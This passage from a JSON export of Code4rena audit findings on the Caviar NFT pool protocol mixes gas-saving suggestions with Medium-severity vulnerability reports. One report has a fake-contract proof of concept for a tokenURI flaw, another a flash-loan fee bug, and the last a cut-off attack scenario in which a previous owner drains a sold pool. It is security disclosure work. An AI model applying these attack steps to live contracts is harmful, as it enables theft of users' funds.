msg.sender.safeTransferETH(netOutputAmount);\n360:\n361:            // if the protocol fee is set then pay the protocol fee\n362:            if (protocolFeeAmount > 0) factory.safeTransferETH(protocolFeeAmount);\n363:        } else {\n364:            // transfer base tokens to the caller\n365:            ERC20(baseToken).transfer(msg.sender, netOutputAmount); // @audit: 2nd sload\n366:\n367:            // if the protocol fee is set then pay the protocol fee\n368:            if (protocolFeeAmount > 0) ERC20(baseToken).safeTransfer(address(factory), protocolFeeAmount); // @audit: 3rd sload\n369:        }\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..2511385 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -353,8 +353,9 @@ contract PrivatePool is ERC721TokenReceiver {\n\n         // subtract the royalty fee amount from the net output amount\n         netOutputAmount -= royaltyFeeAmount;\n-\n-        if (baseToken == address(0)) {\n+\n+        address _baseToken = baseToken;\n+        if (_baseToken == address(0)) {\n             // transfer ETH to the caller\n             msg.sender.safeTransferETH(netOutputAmount);\n\n@@ -362,10 +363,10 @@ contract PrivatePool is ERC721TokenReceiver {\n             if (protocolFeeAmount > 0) factory.safeTransferETH(protocolFeeAmount);\n         } else {\n             // transfer base tokens to the caller\n-            ERC20(baseToken).transfer(msg.sender, netOutputAmount);\n+            ERC20(_baseToken).transfer(msg.sender, netOutputAmount);\n\n             // if the protocol fee is set then pay the protocol fee\n-            if (protocolFeeAmount > 0) ERC20(baseToken).safeTransfer(address(factory), protocolFeeAmount);\n+            if (protocolFeeAmount > 0) ERC20(_baseToken).safeTransfer(address(factory), protocolFeeAmount);\n         }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L225-L259\n\n### Cache `baseToken` to save 3 SLOADs.\n```solidity\nFile: src/PrivatePool.sol\n225:        if (baseToken != address(0) && msg.value > 0) revert InvalidEthAmount(); // @audit: 1st sload\n...        \n254:        if (baseToken != address(0)) { // @audit: 2nd sload\n255:            // transfer the base token from the caller to the contract\n256:            ERC20(baseToken).safeTransferFrom(msg.sender, address(this), netInputAmount); // @audit: 3rd sload\n257:\n258:            // if the protocol fee is set then pay the protocol fee\n259:            if (protocolFeeAmount > 0) ERC20(baseToken).safeTransfer(address(factory), protocolFeeAmount); // @audit: 4th sload\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..5cc3318 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -216,19 +216,22 @@ contract PrivatePool is ERC721TokenReceiver {\n         // ~~~ Checks ~~~ //\n\n         // calculate the sum of weights of the NFTs to buy\n-        uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);\n+        address _baseToken = baseToken;\n+        {\n+            uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);\n\n-        // calculate the required net input amount and fee amount\n-        (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);\n+            // calculate the required net input amount and fee amount\n+            (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);\n\n-        // check that the caller sent 0 ETH if the base token is not ETH\n-        if (baseToken != address(0) && msg.value > 0) revert InvalidEthAmount();\n+            // check that the caller sent 0 ETH if the base token is not ETH\n+            if (_baseToken != address(0) && msg.value > 0) revert InvalidEthAmount();\n\n-        // ~~~ Effects ~~~ //\n+            // ~~~ Effects ~~~ //\n\n-        // update the virtual reserves\n-        virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount);\n-        virtualNftReserves -= uint128(weightSum);\n+            // update the virtual reserves\n+            virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount);\n+            virtualNftReserves -= uint128(weightSum);\n+        }\n\n         // ~~~ Interactions ~~~ //\n\n@@ -251,12 +254,12 @@ contract PrivatePool is ERC721TokenReceiver {\n         // add the royalty fee amount to the net input aount\n         netInputAmount += royaltyFeeAmount;\n\n-        if (baseToken != address(0)) {\n+        if (_baseToken != address(0)) {\n             // transfer the base token from the caller to the contract\n-            ERC20(baseToken).safeTransferFrom(msg.sender, address(this), netInputAmount);\n+            ERC20(_baseToken).safeTransferFrom(msg.sender, address(this), netInputAmount);\n\n             // if the protocol fee is set then pay the protocol fee\n-            if (protocolFeeAmount > 0) ERC20(baseToken).safeTransfer(address(factory), protocolFeeAmount);\n+            if (protocolFeeAmount > 0) ERC20(_baseToken).safeTransfer(address(factory), protocolFeeAmount);\n         } else {\n             // check that the caller sent enough ETH to cover the net required input\n             if (msg.value < netInputAmount) revert InvalidEthAmount();\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "#g-03-state-variables-can-be-cached-instead-of-re-reading-them-from-storage",
      "tags": [],
      "finders": []
    },
    {
      "id": "16264",
      "title": "[G-02] Use calldata instead of memory for function arguments that do not get mutated",
      "impact": "GAS",
      "content": "When you specify a data location as `memory`, that value will be copied into memory. When you specify the location as `calldata`, the value will stay static within calldata. If the value is a large, complex type, using `memory` may result in extra memory expansion costs.\n\n**Note: We are able to change these instances from memory to calldata without causing a `stack too deep` error.**\n\nTotal Instances: `4`\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L385-L393\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L459\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L661-L664\n\n*Gas Savings for `PrivatePool.change`, obtained via protocol's tests: Avg 1489 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  116432  |  142008  |  82138  |    17    |\n| After  |  114756  |  139483  |  80649  |    17    |\n\n*Gas Savings for `PrivatePool.execute`, obtained via protocol's tests: Avg 340 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  18340   |  36348   |  18890  |    6     |\n| After  |  17976   |  35939   |  18550  |    6     |\n\n**Note: `PrivatePool.sumWeightsAndValidateProof` is called by the functions below**.\n\n*Gas Savings for `PrivatePool.buy`, obtained via protocol's tests: Avg 147 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  74037   |  158864  |  70884  |    24    |\n| After  |  73887   |  158708  |  70737  |    24    |\n\n*Gas Savings for `PrivatePool.sell`, obtained via protocol's tests: Avg 171 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  50139   |  170448  |  81969  |    25    |\n| After  |  49989   |  170256  |  81798  |    25    |\n\n```solidity\nFile: src/PrivatePool.sol\n385:    function change(\n386:        uint256[] memory inputTokenIds,\n387:        uint256[] memory inputTokenWeights,\n388:        MerkleMultiProof memory inputProof,\n389:        IStolenNftOracle.Message[] memory stolenNftProofs,\n390:        uint256[] memory outputTokenIds,\n\n459:    function execute(address target, bytes memory data) public payable onlyOwner returns (bytes memory) {\n\n661:    function sumWeightsAndValidateProof(\n662:        uint256[] memory tokenIds,\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..914dace 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -383,11 +383,11 @@ contract PrivatePool is ERC721TokenReceiver {\n     /// @param outputTokenWeights The weights of the NFTs to receive.\n     /// @param outputProof The merkle proof for the weights of each NFT to receive.\n     function change(\n-        uint256[] memory inputTokenIds,\n+        uint256[] calldata inputTokenIds,\n         uint256[] memory inputTokenWeights,\n         MerkleMultiProof memory inputProof,\n         IStolenNftOracle.Message[] memory stolenNftProofs,\n-        uint256[] memory outputTokenIds,\n+        uint256[] calldata outputTokenIds,\n         uint256[] memory outputTokenWeights,\n         MerkleMultiProof memory outputProof\n     ) public payable returns (uint256 feeAmount, uint256 protocolFeeAmount) {\n@@ -456,7 +456,7 @@ contract PrivatePool is ERC721TokenReceiver {\n     /// @param target The address of the target contract.\n     /// @param data The data to send to the target contract.\n     /// @return returnData The return data of the transaction.\n-    function execute(address target, bytes memory data) public payable onlyOwner returns (bytes memory) {\n+    function execute(address target, bytes calldata data) public payable onlyOwner returns (bytes memory) {\n         // call the target with the value and data\n         (bool success, bytes memory returnData) = target.call{value: msg.value}(data);\n\n@@ -659,7 +659,7 @@ contract PrivatePool is ERC721TokenReceiver {\n     /// @param proof The merkle proof for the weights of each NFT.\n     /// @return sum The sum of the weights of each NFT.\n     function sumWeightsAndValidateProof(\n-        uint256[] memory tokenIds,\n+        uint256[] calldata tokenIds,\n         uint256[] memory tokenWeights,\n         MerkleMultiProof memory proof\n     ) public view returns (uint256) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "#g-02-use-calldata-instead-of-memory-for-function-arguments-that-do-not-get-mutated",
      "tags": [],
      "finders": []
    },
    {
      "id": "16263",
      "title": "[G-01] Cache calldata/memory pointers for complex types to avoid offset calculations",
      "impact": "GAS",
      "content": "The function parameters in the following instances are complex types (arrays of structs which contain arrays) and thus will result in more complex offset calculations to retrieve specific data from calldata/memory. We can avoid peforming some of these offset calculations by instantiating calldata/memory pointers.\n\nTotal Instances: `52`\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L106-L138\n\n### Cache calldata pointers for `buys[i]` and `buys[i].tokenIds`\n\n*Gas Savings for `EthRouter.buy`, obtained via protocol's tests: Avg 5987 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  187054  |  397581  |  199750 |    7     |\n| After  |  182524  |  381578  |  193763 |    7     |\n\n```solidity\nFile: src/EthRouter.sol\n106:        for (uint256 i = 0; i < buys.length; i++) {\n107:            if (buys[i].isPublicPool) {\n108:                // execute the buy against a public pool\n109:                uint256 inputAmount = Pair(buys[i].pool).nftBuy{value: buys[i].baseTokenAmount}(\n110:                    buys[i].tokenIds, buys[i].baseTokenAmount, 0\n111:                );\n112:\n113:                // pay the royalties if buyer has opted-in\n114:                if (payRoyalties) {\n115:                    uint256 salePrice = inputAmount / buys[i].tokenIds.length;\n116:                    for (uint256 j = 0; j < buys[i].tokenIds.length; j++) {\n117:                        // get the royalty fee and recipient\n118:                        (uint256 royaltyFee, address royaltyRecipient) =\n119:                            getRoyalty(buys[i].nft, buys[i].tokenIds[j], salePrice);\n120:\n121:                        if (royaltyFee > 0) {\n122:                            // transfer the royalty fee to the royalty recipient\n123:                            royaltyRecipient.safeTransferETH(royaltyFee);\n124:                        }\n125:                    }\n126:                }\n127:            } else {\n128:                // execute the buy against a private pool\n129:                PrivatePool(buys[i].pool).buy{value: buys[i].baseTokenAmount}(\n130:                    buys[i].tokenIds, buys[i].tokenWeights, buys[i].proof\n131:                );\n132:            }\n133:\n134:            for (uint256 j = 0; j < buys[i].tokenIds.length; j++) {\n135:                // transfer the NFT to the caller\n136:                ERC721(buys[i].nft).safeTransferFrom(address(this), msg.sender, buys[i].tokenIds[j]);\n137:            }\n138:        }\n```\n```diff\ndiff --git a/src/EthRouter.sol b/src/EthRouter.sol\nindex 125001d..1ed1c17 100644\n--- a/src/EthRouter.sol\n+++ b/src/EthRouter.sol\n@@ -104,19 +104,21 @@ contract EthRouter is ERC721TokenReceiver {\n\n         // loop through and execute the the buys\n         for (uint256 i = 0; i < buys.length; i++) {\n-            if (buys[i].isPublicPool) {\n+            Buy calldata _buy = buys[i];\n+            uint256[] calldata _tokenIds = _buy.tokenIds;\n+            if (_buy.isPublicPool) {\n                 // execute the buy against a public pool\n-                uint256 inputAmount = Pair(buys[i].pool).nftBuy{value: buys[i].baseTokenAmount}(\n-                    buys[i].tokenIds, buys[i].baseTokenAmount, 0\n+                uint256 inputAmount = Pair(_buy.pool).nftBuy{value: _buy.baseTokenAmount}(\n+                    _tokenIds, _buy.baseTokenAmount, 0\n                 );\n\n                 // pay the royalties if buyer has opted-in\n                 if (payRoyalties) {\n-                    uint256 salePrice = inputAmount / buys[i].tokenIds.length;\n-                    for (uint256 j = 0; j < buys[i].tokenIds.length; j++) {\n+                    uint256 salePrice = inputAmount / _tokenIds.length;\n+                    for (uint256 j = 0; j < _tokenIds.length; j++) {\n                         // get the royalty fee and recipient\n                         (uint256 royaltyFee, address royaltyRecipient) =\n-                            getRoyalty(buys[i].nft, buys[i].tokenIds[j], salePrice);\n+                            getRoyalty(_buy.nft, _tokenIds[j], salePrice);\n\n                         if (royaltyFee > 0) {\n                             // transfer the royalty fee to the royalty recipient\n@@ -126,14 +128,14 @@ contract EthRouter is ERC721TokenReceiver {\n                 }\n             } else {\n                 // execute the buy against a private pool\n-                PrivatePool(buys[i].pool).buy{value: buys[i].baseTokenAmount}(\n-                    buys[i].tokenIds, buys[i].tokenWeights, buys[i].proof\n+                PrivatePool(_buy.pool).buy{value: _buy.baseTokenAmount}(\n+                    _tokenIds, _buy.tokenWeights, _buy.proof\n                 );\n             }\n\n-            for (uint256 j = 0; j < buys[i].tokenIds.length; j++) {\n+            for (uint256 j = 0; j < _tokenIds.length; j++) {\n                 // transfer the NFT to the caller\n-                ERC721(buys[i].nft).safeTransferFrom(address(this), msg.sender, buys[i].tokenIds[j]);\n+                ERC721(_buy.nft).safeTransferFrom(address(this), msg.sender, _tokenIds[j]);\n             }\n         }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L159-L200\n\n### Cache calldata pointers for `sells[i]` and `sells[i].tokenIds`\n\n*Gas Savings for `EthRouter.sell`, obtained via protocol's tests: Avg 5422 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  217300  |  402940  |  232102 |    7     |\n| After  |  212264  |  392556  |  226680 |    7     |\n\n```solidity\nFile: src/EthRouter.sol\n159:        for (uint256 i = 0; i < sells.length; i++) {\n160:            // transfer the NFTs into the router from the caller\n161:            for (uint256 j = 0; j < sells[i].tokenIds.length; j++) {\n162:                ERC721(sells[i].nft).safeTransferFrom(msg.sender, address(this), sells[i].tokenIds[j]);\n163:            }\n164:\n165:            // approve the pair to transfer NFTs from the router\n166:            ERC721(sells[i].nft).setApprovalForAll(sells[i].pool, true);\n167:\n168:            if (sells[i].isPublicPool) {\n169:                // exceute the sell against a public pool\n170:                uint256 outputAmount = Pair(sells[i].pool).nftSell(\n171:                    sells[i].tokenIds,\n172:                    0,\n173:                    0,\n174:                    sells[i].publicPoolProofs,\n175:                    // ReservoirOracle.Message[] is the exact same as IStolenNftOracle.Message[] and can be\n176:                    // decoded/encoded 1-to-1.\n177:                    abi.decode(abi.encode(sells[i].stolenNftProofs), (ReservoirOracle.Message[]))\n178:                );\n179:\n180:                // pay the royalties if seller has opted-in\n181:                if (payRoyalties) {\n182:                    uint256 salePrice = outputAmount / sells[i].tokenIds.length;\n183:                    for (uint256 j = 0; j < sells[i].tokenIds.length; j++) {\n184:                        // get the royalty fee and recipient\n185:                        (uint256 royaltyFee, address royaltyRecipient) =\n186:                            getRoyalty(sells[i].nft, sells[i].tokenIds[j], salePrice);\n187:\n188:                        if (royaltyFee > 0) {\n189:                            // transfer the royalty fee to the royalty recipient\n190:                            royaltyRecipient.safeTransferETH(royaltyFee);\n191:                        }\n192:                    }\n193:                }\n194:            } else {\n195:                // execute the sell against a private pool\n196:                PrivatePool(sells[i].pool).sell(\n197:                    sells[i].tokenIds, sells[i].tokenWeights, sells[i].proof, sells[i].stolenNftProofs\n198:                );\n199:            }\n200:        }\n```\n```diff\ndiff --git a/src/EthRouter.sol b/src/EthRouter.sol\nindex 125001d..12218d6 100644\n--- a/src/EthRouter.sol\n+++ b/src/EthRouter.sol\n@@ -157,33 +157,35 @@ contract EthRouter is ERC721TokenReceiver {\n\n         // loop through and execute the sells\n         for (uint256 i = 0; i < sells.length; i++) {\n+            Sell calldata _sell = sells[i];\n+            uint256[] calldata _tokenIds = _sell.tokenIds;\n             // transfer the NFTs into the router from the caller\n-            for (uint256 j = 0; j < sells[i].tokenIds.length; j++) {\n-                ERC721(sells[i].nft).safeTransferFrom(msg.sender, address(this), sells[i].tokenIds[j]);\n+            for (uint256 j = 0; j < _tokenIds.length; j++) {\n+                ERC721(_sell.nft).safeTransferFrom(msg.sender, address(this), _tokenIds[j]);\n             }\n\n             // approve the pair to transfer NFTs from the router\n-            ERC721(sells[i].nft).setApprovalForAll(sells[i].pool, true);\n+            ERC721(_sell.nft).setApprovalForAll(_sell.pool, true);\n\n-            if (sells[i].isPublicPool) {\n+            if (_sell.isPublicPool) {\n                 // exceute the sell against a public pool\n-                uint256 outputAmount = Pair(sells[i].pool).nftSell(\n-                    sells[i].tokenIds,\n+                uint256 outputAmount = Pair(_sell.pool).nftSell(\n+                    _tokenIds,\n                     0,\n                     0,\n-                    sells[i].publicPoolProofs,\n+                    _sell.publicPoolProofs,\n                     // ReservoirOracle.Message[] is the exact same as IStolenNftOracle.Message[] and can be\n                     // decoded/encoded 1-to-1.\n-                    abi.decode(abi.encode(sells[i].stolenNftProofs), (ReservoirOracle.Message[]))\n+                    abi.decode(abi.encode(_sell.stolenNftProofs), (ReservoirOracle.Message[]))\n                 );\n\n                 // pay the royalties if seller has opted-in\n                 if (payRoyalties) {\n-                    uint256 salePrice = outputAmount / sells[i].tokenIds.length;\n-                    for (uint256 j = 0; j < sells[i].tokenIds.length; j++) {\n+                    uint256 salePrice = outputAmount / _tokenIds.length;\n+                    for (uint256 j = 0; j < _tokenIds.length; j++) {\n                         // get the royalty fee and recipient\n                         (uint256 royaltyFee, address royaltyRecipient) =\n-                            getRoyalty(sells[i].nft, sells[i].tokenIds[j], salePrice);\n+                            getRoyalty(_sell.nft, _tokenIds[j], salePrice);\n\n                         if (royaltyFee > 0) {\n                             // transfer the royalty fee to the royalty recipient\n@@ -193,8 +195,8 @@ contract EthRouter is ERC721TokenReceiver {\n                 }\n             } else {\n                 // execute the sell against a private pool\n-                PrivatePool(sells[i].pool).sell(\n-                    sells[i].tokenIds, sells[i].tokenWeights, sells[i].proof, sells[i].stolenNftProofs\n+                PrivatePool(_sell.pool).sell(\n+                    _tokenIds, _sell.tokenWeights, _sell.proof, _sell.stolenNftProofs\n                 );\n             }\n         }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L261-L287\n\n### Cache calldata pointer for `changes[i]` and memory pointers for `changes[i].inputTokenIds` & `changes[i].outputTokenIds`\n\n*Gas Savings for `EthRouter.change`, obtained via protocol's tests: Avg 4314 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  284857  |  298879  |  217295 |    4     |\n| After  |  279105  |  293127  |  212981 |    4     |\n\n```solidity\nFile: src/EthRouter.sol\n261:        for (uint256 i = 0; i < changes.length; i++) {\n262:            Change memory _change = changes[i];\n263:\n264:            // transfer NFTs from caller\n265:            for (uint256 j = 0; j < changes[i].inputTokenIds.length; j++) {\n266:                ERC721(_change.nft).safeTransferFrom(msg.sender, address(this), _change.inputTokenIds[j]);\n267:            }\n268:\n269:            // approve pair to transfer NFTs from router\n270:            ERC721(_change.nft).setApprovalForAll(_change.pool, true);\n271:\n272:            // execute change\n273:            PrivatePool(_change.pool).change{value: msg.value}(\n274:                _change.inputTokenIds,\n275:                _change.inputTokenWeights,\n276:                _change.inputProof,\n277:                _change.stolenNftProofs,\n278:                _change.outputTokenIds,\n279:                _change.outputTokenWeights,\n280:                _change.outputProof\n281:            );\n282:\n283:            // transfer NFTs to caller\n284:            for (uint256 j = 0; j < changes[i].outputTokenIds.length; j++) {\n285:                ERC721(_change.nft).safeTransferFrom(address(this), msg.sender, _change.outputTokenIds[j]);\n286:            }\n287:        }\n```\n```diff\ndiff --git a/src/EthRouter.sol b/src/EthRouter.sol\nindex 125001d..c63c2f8 100644\n--- a/src/EthRouter.sol\n+++ b/src/EthRouter.sol\n@@ -259,11 +259,13 @@ contract EthRouter is ERC721TokenReceiver {\n\n         // loop through and execute the changes\n         for (uint256 i = 0; i < changes.length; i++) {\n-            Change memory _change = changes[i];\n+            Change calldata _change = changes[i];\n+            uint256[] memory _inputTokenIds = _change.inputTokenIds;\n+            uint256[] memory _outputTokenIds = _change.outputTokenIds;\n\n             // transfer NFTs from caller\n-            for (uint256 j = 0; j < changes[i].inputTokenIds.length; j++) {\n-                ERC721(_change.nft).safeTransferFrom(msg.sender, address(this), _change.inputTokenIds[j]);\n+            for (uint256 j = 0; j < _inputTokenIds.length; j++) {\n+                ERC721(_change.nft).safeTransferFrom(msg.sender, address(this), _inputTokenIds[j]);\n             }\n\n             // approve pair to transfer NFTs from router\n@@ -271,18 +273,18 @@ contract EthRouter is ERC721TokenReceiver {\n\n             // execute change\n             PrivatePool(_change.pool).change{value: msg.value}(\n-                _change.inputTokenIds,\n+                _inputTokenIds,\n                 _change.inputTokenWeights,\n                 _change.inputProof,\n                 _change.stolenNftProofs,\n-                _change.outputTokenIds,\n+                _outputTokenIds,\n                 _change.outputTokenWeights,\n                 _change.outputProof\n             );\n\n             // transfer NFTs to caller\n-            for (uint256 j = 0; j < changes[i].outputTokenIds.length; j++) {\n-                ERC721(_change.nft).safeTransferFrom(address(this), msg.sender, _change.outputTokenIds[j]);\n+            for (uint256 j = 0; j < _outputTokenIds.length; j++) {\n+                ERC721(_change.nft).safeTransferFrom(address(this), msg.sender, _outputTokenIds[j]);\n             }\n         }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "#g-01-cache-calldatamemory-pointers-for-complex-types-to-avoid-offset-calculations",
      "tags": [],
      "finders": []
    },
    {
      "id": "16262",
      "title": "[M-17] The tokenURI method does not check if the NFT has been minted and returns data for the contract that may be a fake NFT",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/Factory.sol#L161\nhttps://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePoolMetadata.sol#L17\n\n\n## Vulnerability details\n\n## Impact\n\n- By invoking the [Factory.tokenURI](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/Factory.sol#L161) method for a maliciously provided NFT id, the returned data may deceive potential users, as the method will return data for a non-existent NFT id that appears to be a genuine PrivatePool. This can lead to a poor user experience or financial loss for users.\n- Violation of the [ERC721-Metadata part](https://eips.ethereum.org/EIPS/eip-721) standard\n\n## Proof of Concept\n\n- The [Factory.tokenURI](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/Factory.sol#L161) and [PrivatePoolMetadata.tokenURI](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePoolMetadata.sol#L17) methods lack any requirements stating that the provided NFT id must be created. We can also see that in the standard implementation by [OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/cf86fd9962701396457e50ab0d6cc78aa29a5ebc/contracts/token/ERC721/ERC721.sol#L94), this check is present:\n- [Throws if `_tokenId` is not a valid NFT](https://eips.ethereum.org/EIPS/eip-721)\n\n### Example\n\n1. User creates a fake contract\n   A simple example so that the `tokenURI` method does not revert:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\ncontract NFT {\n    function balanceOf(address) external pure returns (uint256) {\n        1;\n    }\n}\n\ncontract NonNFT {\n    address public immutable nft;\n\n    address public constant baseToken = address(0);\n    uint256 public constant virtualBaseTokenReserves = 1 ether;\n    uint256 public constant virtualNftReserves = 1 ether;\n    uint256 public constant feeRate = 500;\n\n    constructor() {\n        nft = address(new NFT());\n    }\n}\n```\n\n2. User deploy the contract\n3. Now, by using `tokenURI()` for the deployed user's address, one can fetch information about a non-existent NFT.\n\n## Tools Used\n\n- Manual review\n- Foundry\n\n## Recommended Mitigation Steps\n\n- Throw an error if the NFT id is invalid.",
      "summary": "\nThis bug report is about a vulnerability in the Factory.tokenURI and PrivatePoolMetadata.tokenURI methods of the code-423n4/2023-04-caviar repository. This vulnerability could lead to a poor user experience or financial loss for users, as it allows maliciously provided NFT ids to return data for non-existent NFTs that appear to be genuine PrivatePools. \n\nThe vulnerability was identified through manual review and Foundry tools. The proof of concept involved creating a fake contract, deploying it, and then using the tokenURI method for the deployed user's address to fetch information about a non-existent NFT.\n\nThe recommended mitigation step is to throw an error if the NFT id is invalid. This is already present in the standard implementation by OpenZeppelin, and should be implemented in the code-423n4/2023-04-caviar repository as well.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/44",
      "tags": [
        "Token Existence",
        "ERC721"
      ],
      "finders": [
        "Rolezn  0xSmartContract",
        "Haipls"
      ]
    },
    {
      "id": "16261",
      "title": "[M-16] PrivatePool.flashLoan() takes fee from the wrong address",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L623\n\n\n## Vulnerability details\n\n## Impact\nInstead of taking the fee from the receiver of the flashloan callback, it pulls it from `msg.sender`.\n\nAs specified in [EIP-3156](https://eips.ethereum.org/EIPS/eip-3156#lender-specification):\n> After the callback, the flashLoan function MUST take the amount + fee token from the receiver, or revert if this is not successful.\n\nThis will be an unexpected loss of funds for the caller if they have the pool pre-approved to spend funds (e.g. they previously bought NFTs) and are not the owner of the flashloan contract they use for the callback.\n\nAdditionally, for ETH pools, it expects the caller to pay the fee upfront. But, the fee is generally paid with the profits made using the flashloaned tokens.\n\n## Proof of Concept\nIf `baseToken` is ETH, it expects the fee to already be sent with the call to `flashLoan()`. If it's an ERC20 token, it will pull it from `msg.sender` instead of `receiver`:\n```sol\n    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 tokenId, bytes calldata data)\n        external\n        payable\n        returns (bool)\n    {\n        // ...\n\n        // calculate the fee\n        uint256 fee = flashFee(token, tokenId);\n\n        // if base token is ETH then check that caller sent enough for the fee\n        if (baseToken == address(0) && msg.value < fee) revert InvalidEthAmount();\n        \n        // ...\n\n        // transfer the fee from the borrower\n        if (baseToken != address(0)) ERC20(baseToken).transferFrom(msg.sender, address(this), fee);\n\n        return success;\n    }\n```\n\n## Tools Used\nnone\n\n## Recommended Mitigation Steps\nChange to:\n```sol\n        uint initialBalance = address(this).balance;\n        // ... \n\n        if (baseToken != address(0)) ERC20(baseToken).transferFrom(receiver, address(this), fee);\n        else require(address(this).balance - initialBalance == fee);\n```",
      "summary": "\nThis bug report is about a vulnerability in the PrivatePool.sol code that is part of the 2023-04-caviar GitHub repository. The vulnerability is that instead of taking the fee from the receiver of the flashloan callback, it pulls it from msg.sender. This means that the caller of the flashloan callback could be unexpectedly losing funds if they have the pool pre-approved to spend funds and are not the owner of the flashloan contract they use for the callback. Additionally, for ETH pools, it expects the caller to pay the fee upfront, but the fee is generally paid with the profits made using the flashloaned tokens. \n\nThe recommended mitigation step is to change the code to transfer the fee from the receiver instead of the sender. The code should also check that the balance of the contract is equal to the fee if the base token is ETH. This will ensure that the caller is not unexpectedly losing funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/56",
      "tags": [
        "Flash Loan"
      ],
      "finders": [
        "Ruhum"
      ]
    },
    {
      "id": "16260",
      "title": "[M-15] Pool tokens can be stolen via PrivatePool.flashLoan function from previous owner",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L461\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L623-L654\n\n\n## Vulnerability details\n\n## Impact\n`PrivatePool.sol` ERC721 and ERC20 tokens can be stolen by the previous owner via `execute` and `flashLoan` functions (or by malicious approval by the current owner via `execute`)\n\n## Proof of Concept\nLet's say that Bob is the attacker and Alice is a regular user.\n\n1.Bob creates a `PrivatePool.sol` where he deposits 5 ERC721 tokens and 500 USDC.\n2.Then Bob creates a malicious contract (let's call it `PrivatePoolExploit.sol`) and this contract contains `onFlashLoan` (IERC3156FlashBorrower), `transferFrom` ,`ownerOf`, `onERC721Received` functions (like ERC721 does) and an additional `attack` function.\n3.Via `PrivatePool.execute` function Bob approves USDC spending (`type(uint).max`) and `setApprovalForAll` for ERC721 tokens\n4.Since the ownership of `PrivatePool` is stored in `Factory.sol` as an ERC721 token, ownership can be sold on any ERC721 marketplace. Alice decides to buy Bob's `PrivatePool` and ownership is transferred to Alice.\n5.Right after the ownership is transferred, Bob runs `PrivatePoolExploit.attack` function, which calls `PrivatePool.flashLoan` where `PrivatePoolExploit.transferFrom` will be called since the flash loan can be called on any address.\n6. All the funds are stolen by Bob and Alice's`PrivatePool` is left with nothing.\n\n### Here is a PoC example:\n\nTo run the test:\n\n1.Save `PrivatePoolExploit.sol` under path 